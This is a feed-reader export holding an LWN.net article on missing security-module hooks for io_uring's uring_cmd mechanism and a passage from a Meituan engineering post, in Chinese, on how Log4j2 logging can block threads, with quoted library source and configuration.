        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 28, 2022\n           </div>\nThe relatively new <a href=\"https://lwn.net/Articles/776703/\">io_uring subsystem</a> has\nchanged the way asynchronous I/O is done on Linux systems and improved\nperformance significantly.  It has also, however, begun to run up a record\nof disagreements with the kernel's security community.  A recent\ndiscussion about security hooks for the new uring_cmd mechanism\nshows how easily requirements can be overlooked in a complex system with no\noverall supervision.\n<p>\nMost of the operations that can be performed within io_uring follow the\nusual I/O patterns — open a file, read data, write data, and so on.  These\noperations are the same regardless of the underlying device or filesystem\nthat is doing the work.  There always seems to be a need for something\nspecial and device-specific, though, and io_uring is no exception.  For the\nkernel as a whole, device-specific operations are made available via <a href=\"https://man7.org/linux/man-pages/man2/ioctl.2.html\"><tt>ioctl()</tt></a>\ncalls.  That system call, however, <a href=\"https://lwn.net/Articles/897202/\">has built up\na reputation</a> as a dumping\nground for poorly thought-out features, and there is little desire to see\nits usage spread.\n</p><p>\nIn early 2021, io_uring maintainer Jens Axboe <a href=\"https://lwn.net/Articles/844875/\">floated an idea</a> for a command passthrough\nmechanism that would be specific to io_uring.  A year and some later, that\nidea has evolved into uring_cmd, which was pulled into the\nmainline during the 5.19 merge window.  There is a new io_uring operation\nthat, in turn, causes an invocation of the underlying device or\nfilesystem's <tt>uring_cmd()</tt> <tt>file_operations</tt> function.  The\nactual operation to be performed is passed through to that function with no\ninterpretation in the io_uring layer.  The <a href=\"https://lwn.net/ml/io-uring/20220511054750.20432-1-joshi.k@samsung.com/\">first\nuser</a> is the NVMe driver, \nwhich provides a direct passthrough operation.\n</p><p>\n</p><h4>Missing security hooks</h4>\n<p>\nJust over one year ago, there was <a href=\"https://lwn.net/Articles/858023/\">a bit of a\ndisagreement</a> after the developers of the kernels Linux Security Module\n(LSM) and auditing subsystems figured out that there were no security or\nauditing hooks in all of that new io_uring code.  That put io_uring\noperations outside the control of any security module that a given system\nmight be running and made those operations invisible to auditing.  Those\ngaps were filled in, but not before the security developers expressed their\nunhappiness about how io_uring had been designed and merged without thought\nfor LSM and audit support.\n</p><p>\nGiven that, one might expect that the addition of a new feature like\n<tt>uring_cmd</tt> would have seen more involvement from the security\ncommunity.  To an extent, that happened; Luis Chamberlain <a href=\"https://lwn.net/ml/io-uring/YiuC1fhEiRdo5bPd@bombadil.infradead.org/\">posted a\npatch</a> adding LSM support back in March.  In short, it added a new\n<tt>security_uring_async_cmd()</tt> hook that would be called before\npassing a command through to the underlying code; it could examine that\ncommand and decide whether to allow or deny the operation.  There were some\ndisagreements over how well this would work; in particular, Casey Schaufler\n<a href=\"https://lwn.net/ml/io-uring/8adf55db-7bab-f59d-d612-ed906b948d19@schaufler-ca.com/\">complained</a>\nthat security modules would have to gain an understanding of every\ndevice-specific command, which clearly would not scale well.\nThe conversation wound down shortly thereafter.\n</p><p>\nWhen the new feature was pushed\ninto the mainline, there was no LSM support included with it.  On\nJuly 13, Chamberlain <a href=\"https://lwn.net/ml/linux-block/20220714000536.2250531-1-mcgrof@kernel.org/\">reposted\nhis patch</a> adding the new security hook.  Schaufler <a href=\"https://lwn.net/ml/linux-block/30dee52c-80e7-f1d9-a2e2-018e7761b8ea@schaufler-ca.com/\">was\nequally unimpressed</a> this time around:\n</p><p>\n</p><blockquote>\n\tYou're passing the complexity of uring-cmd directly into each and\n\tevery security module. SELinux, AppArmor, Smack, BPF and every\n\tother LSM now needs to know the gory details of everything that\n\tmight be in any arbitrary subsystem so that it can make a wild\n\tguess about what to do. And I thought ioctl was hard to deal with.\n</blockquote>\n<p>\nSELinux and audit maintainer Paul Moore <a href=\"https://lwn.net/ml/linux-block/CAHC9VhSjfrMtqy_6+=_=VaCsJKbKU1oj6TKghkue9LrLzO_++w@mail.gmail.com/\">agreed</a>\nwith that assessment.  The end result, he said, was that security modules\nwould be unable to distinguish between low-level operations, so they\nwould end up simply enabling all io_uring passthrough commands for any\ngiven subsystem or none of them; \"<q>I think we can all agree that is not a\ngood idea</q>\".  He later <a href=\"https://lwn.net/ml/linux-block/CAHC9VhQMABYKRqZmJQtXai0gtiueU42ENvSUH929=pF6tP9xOg@mail.gmail.com/\">acknowledged</a>\nthat there does not appear to be a better solution at hand and merging\nChamberlain's patch looked like the only path forward: \"<q>Without any\ncooperation from the io_uring developers, that is likely what we will have\nto do</q>\".  The current plan appears to be to get Chamberlain's patch into\nthe mainline during the next merge window, with backports to the stable\nkernels to be done thereafter.\n</p><p>\n</p><h4>Grumpiness</h4>\n<p>\nThis particular problem appears to be solved, albeit in a way that is\nless than satisfying to the security community.  A better solution may\nmaterialize in the future, though providing a way to control access to\ndevice-specific functionality in a general way is a hard problem.  But a\nharder problem may be addressing the residual grumpiness in the security\ncommunity and preventing such problems from recurring in the future.  As\nMoore <a href=\"https://lwn.net/ml/linux-block/CAHC9VhRCW4PFwmwyAYxYmLUDuY-agHm1CejBZJUpHTVbZE8L1Q@mail.gmail.com/\">put\nit</a>:\n</p><p>\n</p><blockquote>\n\tI feel that expressing frustration about the LSMs being routinely\n\tleft out of the discussion when new functionality is added to the\n\tkernel is a reasonable response; especially when one considers the\n\thistory of this particular situation.\n</blockquote>\n<p>\nFor his part, Axboe <a href=\"https://lwn.net/ml/linux-block/711b10ab-4ac7-e82f-e125-658460acda89@kernel.dk/\">acknowledged</a>\nthat the security concerns should not have been allowed to fall through the\ncracks, but he didn't necessarily offer a lot of hope for changes in the\nfuture:\n</p><p>\n</p><blockquote>\n\tI guess it's just somewhat lack of interest, since most of us don't\n\thave to deal with anything that uses LSM. And then it mostly just\n\tgets in the way and adds overhead, both from a runtime and\n\tmaintainability point of view, which further reduces the\n\tmotivation.\n</blockquote>\n<p>\nEven when the motivation is there, mistakes can happen.\nKernel development is a complex business.  A lot of effort has gone into\nmaking the kernel sufficiently modular that developers need not worry about\nwhat is happening in the rest of the system, but there are limits to how\nfar that process can go.\n</p><p>\nFor example, developers must be aware of locking and the\nlocking requirements of subsystems they call into or things may go badly\nwrong.  Memory must be handled according to the constraints placed on the\nmemory-management subsystem, and developers creating complex caches may\nhave to implement shrinkers to release memory on demand.  CPU hotplug\naffects many subsystems and must be taken into account.  The same is true\nof power-management events.  Changes to the user-space API can create\nunhappiness years later.  Inattention to latency constraints may create\ntrouble in realtime applications.  A failure to properly document a\nsubsystem will make life harder for developers and users — but they are all\nused to that by now.\n</p><p>\nAnd, of course, a failure to provide proper security hooks will hobble the\nability of administrators to control process behavior by way of LSM\npolicies. \n</p><p>\nThe fact that developers do not always succeed in keeping all of these\nconstraints in mind — and consequently make mistakes — is unsurprising.\nCatching such omissions is one of the reasons for the existence of the\nkernel's sometimes tiresome review process.  But nothing ensures that\na given change will be properly reviewed by, for example, a developer who\nunderstands the needs of Linux security modules, and there is little that\nforces the suggestions from any such review to be heeded.\n</p><p>\nSo important things will occasionally fall through the cracks, and it is\nnot clear that much can be done to improve the situation.  It would be\nwonderful if more companies would pay developers to spend more time\nreviewing patches to provide, as an example, an overall security-oriented\neye on code heading into the mainline, but that does not appear to be the\nworld that we are living in.  Attempts to impose requirements with a more\nbureaucratic process would mostly create friction and lead to the\ndistribution of more out-of-tree (and severely unreviewed) code.\n</p><p>\nThe best path toward improvement may be, as Axboe <a href=\"https://lwn.net/ml/linux-block/2c6541c2-d55b-4fbc-ec03-3b84722b7264@kernel.dk/\">put\nit</a>, \"<q>one subsystem being aware of another one's needs</q>\".  Working\ntoward that goal — and the ability to fix mistakes in the stable kernels\nwhen they do happen — seems to work reasonably well most of the time.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Development_model-Code_review\">Development model/Code review</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#io_uring\">io_uring</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Security-Security_modules\">Security/Security modules</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/29/tips-for-avoiding-log-blocking-threads.html",
    "timestampUsec": "1659060828052213",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "日志导致线程Block的这些坑，你不得不防",
    "author": ";美团技术团队",
    "published": 1659052800,
    "updated": 1659052800,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/29/tips-for-avoiding-log-blocking-threads.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 前言</h2><p>日志对程序的重要性不言而喻。它很“大”，我们在项目中经常通过日志来记录信息和排查问题，相关代码随处可见。它也很“小”，作为辅助工具，日志使用简单、上手快，我们通常不会花费过多精力耗在日志上。但看似不起眼的日志也隐藏着各种各样的“坑”，如果使用不当，它不仅不能帮助我们，反而还可能降低服务性能，甚至拖垮我们的服务。</p><p>日志导致线程Block的问题，相信你或许已经遇到过，对此应该深有体会；或许你还没遇到过，但不代表没有问题，只是可能还没有触发而已。本文主要介绍美团统一API网关服务Shepherd（参见<a href=\"https://mp.weixin.qq.com/s/iITqdIiHi3XGKq6u6FRVdg\">《百亿规模API网关服务Shepherd的设计与实现》</a>一文）在实践中所踩过的关于日志导致线程Block的那些“坑”，然后再分享一些避“坑”经验。</p><h2>2. 背景</h2><p>API网关服务Shepherd基于Java语言开发，使用业界大名鼎鼎的<a href=\"https://logging.apache.org/log4j/2.x/\">Apache Log4j2</a>作为主要日志框架，同时使用美团内部的XMD-Log SDK和Scribe-Log SDK对日志内容进行处理，日志处理整体流程如下图1所示。业务打印日志时，日志框架基于Logger配置来决定把日志交给XMDFile处理还是Scribe处理。其中，XMDFile是XMD-Log内部提供的日志Appender名称，负责输出日志到本地磁盘，Scribe是Scribe-Log内部提供的日志Appender名称，负责上报日志到远程日志中心。</p><p><img src=\"https://p0.meituan.net/travelcube/2e435a6e5275b41caaea13adc19f34ef45934.png\" alt=\"图1 日志处理流程示意图\" referrerpolicy=\"no-referrer\"></p><p>随着业务的快速增长，日志导致的线程Block问题愈发频繁。比如调用后端RPC服务超时，导致调用方大量线程Block；再比如，业务内部输出异常日志导致服务大量线程Block等，这些问题严重影响着服务的稳定性。因此，我们结合项目在过去一段时间暴露出来的各种由于日志导致的线程Block问题，对日志框架存在的稳定性风险因素进行了彻底的排查和修复，并在线下、线上环境进行全方位验证。在此过程中，我们总结了一些日志使用相关的实践经验，希望分享给大家。</p><p>在进入正文前，首先介绍项目当时的运行环境和日志相关配置信息。</p><ul><li><strong>JDK版本</strong></li></ul><pre><code>java version \"1.8.0_45\"\nJava(TM) SE Runtime Environment (build 1.8.0_45-b14)\nJava HotSpot(TM) 64-Bit Server VM (build 25.45-b02, mixed mode)\n</code></pre><ul><li><strong>日志依赖版本</strong></li></ul><pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre><ul><li><strong>日志配置文件</strong></li></ul><pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration status=\"warn\"&gt;\n    &lt;appenders&gt;\n        &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" follow=\"true\"&gt;\n            &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n\" /&gt;\n        &lt;/Console&gt;\n\n        &lt;XMDFile name=\"ShepherdLog\" fileName=\"shepherd.log\"/&gt;\n\n        &lt;!--XMDFile异步磁盘日志配置示例--&gt;\n        &lt;!--默认按天&amp;按512M文件大小切分日志，默认最多保留30个日志文件。--&gt;\n        &lt;!--注意：fileName前会自动增加文件路径，只配置文件名即可--&gt;\n        &lt;XMDFile name=\"LocalServiceLog\" fileName=\"request.log\"/&gt;\n\n        &lt;Scribe name=\"LogCenterSync\"&gt;\n            &lt;!-- 在指定日志名方面，scribeCategory 和 appkey 两者至少存在一种，且 scribeCategory 高于 appkey。--&gt;\n            &lt;!-- &lt;Property name=\"scribeCategory\"&gt;data_update_test_lc&lt;/Property&gt; --&gt;\n            &lt;LcLayout/&gt;\n        &lt;/Scribe&gt;\n        &lt;Async name=\"LogCenterAsync\" blocking=\"false\"&gt;\n            &lt;AppenderRef ref=\"LogCenterSync\"/&gt;\n        &lt;/Async&gt;\n    &lt;/appenders&gt;\n\n    &lt;loggers&gt;\n        &lt;AsyncLogger name=\"com.sankuai.shepherd\" level=\"info\" additivity=\"false\"&gt;\n            &lt;AppenderRef ref=\"ShepherdLog\" level=\"warn\"/&gt;\n            &lt;AppenderRef ref=\"LogCenterAsync\" level=\"info\"/&gt;\n        &lt;/AsyncLogger&gt;\n\n        &lt;root level=\"info\"&gt;\n            &lt;!--Console日志是同步、阻塞的，推荐只在本地调试时使用，线上将该配置去掉--&gt;\n            &lt;!--appender-ref ref=\"Console\" /--&gt;\n            &lt;appender-ref ref=\"LocalServiceLog\"/&gt;\n            &lt;appender-ref ref=\"LogCenterAsync\"/&gt;\n        &lt;/root&gt;\n    &lt;/loggers&gt;\n&lt;/configuration&gt;\n</code></pre><h2>3. 踩过的坑</h2><p>本章节主要记录项目过去一段时间，我们所遇到的一系列日志导致的线程Block问题，并逐个深入分析问题根因。</p><h3>3.1 日志队列满导致线程Block</h3><h4>3.1.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如图2和图3所示。</p><p><img src=\"https://p0.meituan.net/travelcube/320a639179808a5ca7746ad3251336ff509524.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/1a422c3e76caddc87c927bf3d53c938e611650.png\" alt=\"图2 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/e9f141792d12fe30cf9c2efb6d054264454549.png\" alt=\"图3 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出这跟日志打印相关，而且是INFO级别的日志，遂即登陆机器查看日志是否有异样，发现当时日志量非常大，差不多每两分钟就写满一个500MB的日志文件。</p><p>那大量输出日志和线程Block之间会有怎样的关联呢？接下来本章节将结合如下图4所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/606e8387ee50e3035c35df87c23a94eb113029.png\" alt=\"图4 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.1.2 为什么会Block线程？</h4><p>从Blocked线程堆栈着手分析，查看PrintStream相关代码片段如下图5所示，可以看到被阻塞地方有synchronized同步调用，再结合上文发现每两分钟写满一个500MB日志文件的现象，初步怀疑是日志量过大导致了线程阻塞。</p><p><img src=\"https://p0.meituan.net/travelcube/7fd03330c8f39d30cdadf02bf57a976f92577.png\" alt=\"图5 PringStream代码片段\" referrerpolicy=\"no-referrer\"></p><p>但上述猜测仍有一些值得推敲的地方：</p><ol><li>如果仅仅因为日志量过大就导致线程Block，那日志框架也太不堪重用了，根本没法在高并发、高吞吐业务场景下使用。</li><li>日志配置里明明是输出日志到文件，怎么会输出到Console PrintStream？</li></ol><h4>3.1.3 为什么会输出到Console？</h4><p>继续沿着线程堆栈调用链路分析，可以看出是AsyncAppender调用append方法追加日志时发生了错误，相关代码片段如下：</p><pre><code>// org.apache.logging.log4j.core.appender.AsyncAppender\n\n// 内部维护的阻塞队列，队列大小默认是128\nprivate final BlockingQueue&lt;LogEvent&gt; queue;\n\n@Override\npublic void append(final LogEvent logEvent) {\n    if (!isStarted()) {\n        throw new IllegalStateException(\"AsyncAppender \" + getName() + \" is not active\");\n    }\n    if (!Constants.FORMAT_MESSAGES_IN_BACKGROUND) { // LOG4J2-898: user may choose\n        logEvent.getMessage().getFormattedMessage(); // LOG4J2-763: ask message to freeze parameters\n    }\n    final Log4jLogEvent memento = Log4jLogEvent.createMemento(logEvent, includeLocation);\n  // 日志事件转入异步队列\n    if (!transfer(memento)) {\n      // 执行到这里说明队列满了，入队失败，根据是否blocking执行具体策略\n        if (blocking) {\n          // 阻塞模式，选取特定的策略来处理，策略可能是 \"忽略日志\"、\"日志入队并阻塞\"、\"当前线程打印日志\"\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRoute route = asyncQueueFullPolicy.getRoute(thread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n          // 非阻塞模式，交由 ErrorHandler 处理失败日志\n            error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n}\n\nprivate boolean transfer(final LogEvent memento) {\n    return queue instanceof TransferQueue\n        ? ((TransferQueue&lt;LogEvent&gt;) queue).tryTransfer(memento)\n        : queue.offer(memento);\n}\n\npublic void error(final String msg) {\n    handler.error(msg);\n}\n</code></pre><p>AsyncAppender顾名思义是个异步Appender，采用异步方式处理日志，在其内部维护了一个BlockingQueue队列，每次处理日志时，都先尝试把Log4jLogEvent事件存入队列中，然后交由后台线程从队列中取出事件并处理（把日志交由AsyncAppender所关联的Appender处理），但队列长度总是有限的，且队列默认大小是128，如果日志量过大或日志异步线程处理不及时，就很可能导致日志队列被打满。</p><p>当日志队列满时，日志框架内部提供了两种处理方式，具体如下：</p><ul><li>如果blocking配置为true，会选择相应的处理策略，默认是SYNCHRONOUS策略，可以在log4j2.component.properties文件中，通过log4j2.AsyncQueueFullPolicy参数配置日志框架提供的其他策略或自定义策略。<ul><li><strong>DISCARD策略</strong>，直接忽略日志。</li><li><strong>SYNCHRONOUS策略</strong>，当前线程直接发送日志到Appender。</li><li><strong>ENQUEUE策略</strong>，强制阻塞入队。</li></ul></li><li>如果blocking配置为false，则由ErrorHandler和ErrorAppender处理失败日志。日志框架提供了默认的ErrorHandler实现，即DefaultErrorHandler，目前暂不支持业务在XML、JSON等日志配置文件里自定义ErrorHandler。日志框架默认不提供ErrorAppender，业务如有需要可在XML、JSON等日志配置文件里自定义error-ref配置。</li></ul><p>在本项目的日志配置文件中可以看到，AsyncAppender设置了blocking为false，且没有配置error-ref，下面具体分析DefaultErrorHandler。</p><pre><code>// org.apache.logging.log4j.core.appender.DefaultErrorHandler\n\nprivate static final Logger LOGGER = StatusLogger.getLogger();\n\nprivate static final int MAX_EXCEPTIONS = 3;\n\n// 5min 时间间隔\nprivate static final long EXCEPTION_INTERVAL = TimeUnit.MINUTES.toNanos(5);\n\nprivate int exceptionCount = 0;\n\nprivate long lastException = System.nanoTime() - EXCEPTION_INTERVAL - 1;\n\npublic void error(final String msg) {\n    final long current = System.nanoTime();\n  // 当前时间距离上次异常处理时间间隔超过5min 或者异常处理数小于3次\n    if (current - lastException &gt; EXCEPTION_INTERVAL || exceptionCount++ &lt; MAX_EXCEPTIONS) {\n      // StatusLogger 负责处理\n        LOGGER.error(msg);\n    }\n    lastException = current;\n}\n</code></pre><p>DefaultErrorHandler内部在处理异常日志时增加了条件限制，只有下述<strong>两个条件任一满足</strong>时才会处理，从而避免大量异常日志导致的性能问题。</p><ul><li><strong>两条日志处理间隔超过5min。</strong></li><li><strong>异常日志数量不超过3次。</strong></li></ul><p>但项目所用日志框架版本的默认实现看起来存在一些不太合理的地方：</p><ul><li>lastException用于标记上次异常的时间戳，该变量可能被多线程访问，<strong>无法保证多线程情况下的线程安全。</strong></li><li>exceptionCount用于统计异常日志次数，该变量可能被多线程访问，<strong>无法保证多线程情况下的线程安全。</strong></li></ul><p>所以，在多线程场景下，可能有大量异常日志同时被DefaultErrorHandler处理，带来线程安全问题。值得一提的是，该问题已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-3185\">Issue: DefaultErrorHandler can not share values across threads</a>反馈给社区，并在<a href=\"https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0\">2.15.0</a>版本中进行了修复。</p><p>从上述DefaultErrorHandler代码中可以看到，真正负责处理日志的是StatusLogger，继续跟进代码进入logMessage方法，方法执行逻辑如下：</p><ul><li>如果StatusLogger内部注册了StatusListener，则由对应的StatusListener负责处理日志。</li><li>否则由SimpleLogger负责处理日志，直接输出日志到System.err输出流。</li></ul><pre><code>// org.apache.logging.log4j.status.StatusLogger\n\nprivate static final StatusLogger STATUS_LOGGER = new StatusLogger(StatusLogger.class.getName(),\n            ParameterizedNoReferenceMessageFactory.INSTANCE);\n\n// StatusListener\nprivate final Collection&lt;StatusListener&gt; listeners = new CopyOnWriteArrayList&lt;&gt;();\n\nprivate final SimpleLogger logger;\n\nprivate StatusLogger(final String name, final MessageFactory messageFactory) {\n    super(name, messageFactory);\n    this.logger = new SimpleLogger(\"StatusLogger\", Level.ERROR, false, true, false, false, Strings.EMPTY,\n            messageFactory, PROPS, System.err);\n    this.listenersLevel = Level.toLevel(DEFAULT_STATUS_LEVEL, Level.WARN).intLevel();\n}\n\n/**\n * Retrieve the StatusLogger.\n *\n * @return The StatusLogger.\n */\npublic static StatusLogger getLogger() {\n    return STATUS_LOGGER;\n}\n\n@Override\npublic void logMessage(final String fqcn, final Level level, final Marker marker, final Message msg,\n        final Throwable t) {\n    StackTraceElement element = null;\n    if (fqcn != null) {\n        element = getStackTraceElement(fqcn, Thread.currentThread().getStackTrace());\n    }\n    final StatusData data = new StatusData(element, level, msg, t, null);\n    msgLock.lock();\n    try {\n        messages.add(data);\n    } finally {\n        msgLock.unlock();\n    }\n  \n    if (listeners.size() &gt; 0) {\n      // 如果系统注册了 listener，由 StatusConsoleListener 处理日志\n        for (final StatusListener listener : listeners) {\n            if (data.getLevel().isMoreSpecificThan(listener.getStatusLevel())) {\n                listener.log(data);\n            }\n        }\n    } else {\n      // 否则由 SimpleLogger 处理日志，直接输出到 System.err\n        logger.logMessage(fqcn, level, marker, msg, t);\n    }\n}\n</code></pre><p>从上述Blocked线程堆栈来看，是StatusConsoleListener负责处理日志，而StatusConsoleListener是StatusListener接口的实现类，那么StatusConsoleListener是如何被创建的？</p><h4>3.1.4 StatusConsoleListener是怎么来的？</h4><p>通常来说，每个项目都会有一个日志配置文件（如log4j2.xml），该配置对应Log4j2日志框架中的Configuration接口，不同的日志配置文件格式有不同的实现类：</p><ul><li>XmlConfiguration，即XML格式日志配置</li><li>JsonConfiguration，即JSON格式日志配置</li><li>XMDConfiguration，即美团内部日志组件XMD-Log定义的日志配置（XML格式）</li><li>……</li></ul><p>log4j2.xml 示例配置（仅做示例，请勿实际项目中使用该配置）。</p><pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;Configuration status=\"debug\" name=\"RoutingTest\"&gt;\n  &lt;Properties&gt;\n    &lt;Property name=\"filename\"&gt;target/rolling1/rollingtest-$${sd:type}.log&lt;/Property&gt;\n  &lt;/Properties&gt;\n  &lt;ThresholdFilter level=\"debug\"/&gt;\n \n  &lt;Appenders&gt;\n    &lt;Console name=\"STDOUT\"&gt;\n      &lt;PatternLayout pattern=\"%m%n\"/&gt;\n      &lt;ThresholdFilter level=\"debug\"/&gt;\n    &lt;/Console&gt;\n    &lt;Routing name=\"Routing\"&gt;\n      &lt;Routes pattern=\"$${sd:type}\"&gt;\n        &lt;Route&gt;\n          &lt;RollingFile name=\"Rolling-${sd:type}\" fileName=\"${filename}\"\n                       filePattern=\"target/rolling1/test1-${sd:type}.%i.log.gz\"&gt;\n            &lt;PatternLayout&gt;\n              &lt;pattern&gt;%d %p %c{1.} [%t] %m%n&lt;/pattern&gt;\n            &lt;/PatternLayout&gt;\n            &lt;SizeBasedTriggeringPolicy size=\"500\" /&gt;\n          &lt;/RollingFile&gt;\n        &lt;/Route&gt;\n        &lt;Route ref=\"STDOUT\" key=\"Audit\"/&gt;\n      &lt;/Routes&gt;\n    &lt;/Routing&gt;\n  &lt;/Appenders&gt;\n \n  &lt;Loggers&gt;\n    &lt;Logger name=\"EventLogger\" level=\"info\" additivity=\"false\"&gt;\n      &lt;AppenderRef ref=\"Routing\"/&gt;\n    &lt;/Logger&gt;\n \n    &lt;Root level=\"error\"&gt;\n      &lt;AppenderRef ref=\"STDOUT\"/&gt;\n    &lt;/Root&gt;\n  &lt;/Loggers&gt;\n&lt;/Configuration&gt;\n</code></pre><p>Log4j2在启动时会加载并解析log4j2.xml配置文件，由对应的ConfigurationFactory创建具体Configuration实例。</p><pre><code>// org.apache.logging.log4j.core.config.xml.XmlConfiguration\n\npublic XmlConfiguration(final LoggerContext loggerContext, final ConfigurationSource configSource) {\n    super(loggerContext, configSource);\n    final File configFile = configSource.getFile();\n    byte[] buffer = null;\n\n    try {\n        final InputStream configStream = configSource.getInputStream();\n        try {\n            buffer = toByteArray(configStream);\n        } finally {\n            Closer.closeSilently(configStream);\n        }\n        final InputSource source = new InputSource(new ByteArrayInputStream(buffer));\n        source.setSystemId(configSource.getLocation());\n        final DocumentBuilder documentBuilder = newDocumentBuilder(true);\n        Document document;\n        try {\n          // 解析 xml 配置文件\n            document = documentBuilder.parse(source);\n        } catch (final Exception e) {\n            // LOG4J2-1127\n            final Throwable throwable = Throwables.getRootCause(e);\n            if (throwable instanceof UnsupportedOperationException) {\n                LOGGER.warn(\n                        \"The DocumentBuilder {} does not support an operation: {}.\"\n                        + \"Trying again without XInclude...\",\n                        documentBuilder, e);\n                document = newDocumentBuilder(false).parse(source);\n            } else {\n                throw e;\n            }\n        }\n        rootElement = document.getDocumentElement();\n      // 处理根节点属性配置，即 &lt;Configuration&gt;&lt;/Configuration&gt; 节点\n        final Map&lt;String, String&gt; attrs = processAttributes(rootNode, rootElement);\n      // 创建 StatusConfiguration\n        final StatusConfiguration statusConfig = new StatusConfiguration().withVerboseClasses(VERBOSE_CLASSES)\n                .withStatus(getDefaultStatus());\n        for (final Map.Entry&lt;String, String&gt; entry : attrs.entrySet()) {\n            final String key = entry.getKey();\n            final String value = getStrSubstitutor().replace(entry.getValue());\n          // 根据配置文件中的 status 属性值，来设置 StatusConfiguration 的 status level\n            if (\"status\".equalsIgnoreCase(key)) {\n                statusConfig.withStatus(value);\n            // 根据配置文件中的 dest 属性值，来设置 StatusConfiguration 的日志输出 destination\n            } else if (\"dest\".equalsIgnoreCase(key)) {\n                statusConfig.withDestination(value);\n            } else if (\"shutdownHook\".equalsIgnoreCase(key)) {\n                isShutdownHookEnabled = !\"disable\".equalsIgnoreCase(value);\n            } else if (\"verbose\".equalsIgnoreCase(key)) {\n                statusConfig.withVerbosity(value);\n            } else if (\"packages\".equalsIgnoreCase(key)) {\n                pluginPackages.addAll(Arrays.asList(value.split(Patterns.COMMA_SEPARATOR)));\n            } else if (\"name\".equalsIgnoreCase(key)) {\n                setName(value);\n            } else if (\"strict\".equalsIgnoreCase(key)) {\n                strict = Boolean.parseBoolean(value);\n            } else if (\"schema\".equalsIgnoreCase(key)) {\n                schemaResource = value;\n            } else if (\"monitorInterval\".equalsIgnoreCase(key)) {\n                final int intervalSeconds = Integer.parseInt(value);\n                if (intervalSeconds &gt; 0) {\n                    getWatchManager().setIntervalSeconds(intervalSeconds);\n                    if (configFile != null) {\n                        final FileWatcher watcher = new ConfiguratonFileWatcher(this, listeners);\n                        getWatchManager().watchFile(configFile, watcher);\n                    }\n                }\n            } else if (\"advertiser\".equalsIgnoreCase(key)) {\n                createAdvertiser(value, configSource, buffer, \"text/xml\");\n            }\n        }\n      \n     // 初始化 StatusConfiguration\n        statusConfig.initialize();\n    } catch (final SAXException | IOException | ParserConfigurationException e) {\n        LOGGER.error(\"Error parsing \" + configSource.getLocation(), e);\n    }\n\n    if (getName() == null) {\n        setName(configSource.getLocation());\n    }\n  \n  // 忽略以下内容\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.config.status.StatusConfiguration\n\nprivate static final PrintStream DEFAULT_STREAM = System.out;\nprivate static final Level DEFAULT_STATUS = Level.ERROR;\nprivate static final Verbosity DEFAULT_VERBOSITY = Verbosity.QUIET;\n\nprivate final Collection&lt;String&gt; errorMessages = Collections.synchronizedCollection(new LinkedList&lt;String&gt;());\n// StatusLogger\nprivate final StatusLogger logger = StatusLogger.getLogger();\n\nprivate volatile boolean initialized = false;\n\nprivate PrintStream destination = DEFAULT_STREAM;\nprivate Level status = DEFAULT_STATUS;\nprivate Verbosity verbosity = DEFAULT_VERBOSITY;\n\npublic void initialize() {\n    if (!this.initialized) {\n        if (this.status == Level.OFF) {\n            this.initialized = true;\n        } else {\n            final boolean configured = configureExistingStatusConsoleListener();\n            if (!configured) {\n              // 注册新 StatusConsoleListener\n                registerNewStatusConsoleListener();\n            }\n            migrateSavedLogMessages();\n        }\n    }\n}\n\nprivate boolean 